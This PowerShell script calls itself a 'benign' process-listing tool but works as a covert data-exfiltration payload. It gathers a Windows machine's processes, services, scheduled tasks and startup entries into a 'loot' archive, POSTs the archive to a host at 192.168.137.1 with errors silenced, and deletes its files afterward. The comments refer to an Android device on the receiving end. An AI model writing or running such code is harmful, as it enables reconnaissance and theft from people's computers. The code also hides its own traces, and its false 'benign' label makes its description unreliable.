# Benign process list collection script
# Collects information about running processes

# Helper function to write UTF-8 files (readable on Android/Linux)
function Write-LootFile {
    param([string]$Path, [string]$Content)
    try {
        $utf8NoBom = New-Object System.Text.UTF8Encoding $false
        $bytes = $utf8NoBom.GetBytes($Content)
        [System.IO.File]::WriteAllBytes($Path, $bytes)
    } catch {
        $Content | Out-File -FilePath $Path -Encoding ASCII -Force
    }
}

$OutputDir = "$env:TEMP\loot_$PID"
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# Running processes
$content = "=== Running Processes ===`n" + (Get-Process | Select-Object Name, Id, CPU, WorkingSet, Path | Format-Table -AutoSize | Out-String -Width 200) + "`n" + (tasklist /v | Out-String)
Write-LootFile -Path "$OutputDir\processes.txt" -Content $content

# Services
$content = "=== Services ===`n" + (Get-Service | Format-Table -AutoSize | Out-String -Width 200)
Write-LootFile -Path "$OutputDir\services.txt" -Content $content

# Scheduled tasks
try {
    $content = "=== Scheduled Tasks ===`n" + (Get-ScheduledTask | Select-Object TaskName, State, TaskPath | Format-Table -AutoSize | Out-String -Width 200)
    Write-LootFile -Path "$OutputDir\tasks.txt" -Content $content
} catch {
    Write-LootFile -Path "$OutputDir\tasks.txt" -Content "Scheduled tasks collection failed"
}

# Startup programs
try {
    $content = "=== Startup Programs ===`n" + (Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Format-Table -AutoSize | Out-String -Width 200)
    Write-LootFile -Path "$OutputDir\startup.txt" -Content $content
} catch {
    Write-LootFile -Path "$OutputDir\startup.txt" -Content "Startup programs collection failed"
}

# Create archive with forward slashes (Android compatible)
$ArchivePath = "$env:TEMP\loot.zip"
if (Test-Path $ArchivePath) { Remove-Item -Force $ArchivePath -ErrorAction SilentlyContinue }

try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zip = [System.IO.Compression.ZipFile]::Open($ArchivePath, 'Create')
    try {
        Get-ChildItem -Path $OutputDir -File -Recurse | ForEach-Object {
            $relativePath = $_.FullName.Substring($OutputDir.Length + 1).Replace('\', '/')
            $entry = $zip.CreateEntry($relativePath)
            $entryStream = $entry.Open()
            try {
                $fileStream = [System.IO.File]::OpenRead($_.FullName)
                try { $fileStream.CopyTo($entryStream) } finally { $fileStream.Close() }
            } finally { $entryStream.Close() }
        }
    } finally { $zip.Dispose() }
} catch {
    Compress-Archive -Path $OutputDir -DestinationPath $ArchivePath -Force
}

Invoke-RestMethod -Uri "http://192.168.137.1/" -Method Post -InFile $ArchivePath -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $OutputDir, $ArchivePath -ErrorAction SilentlyContinue
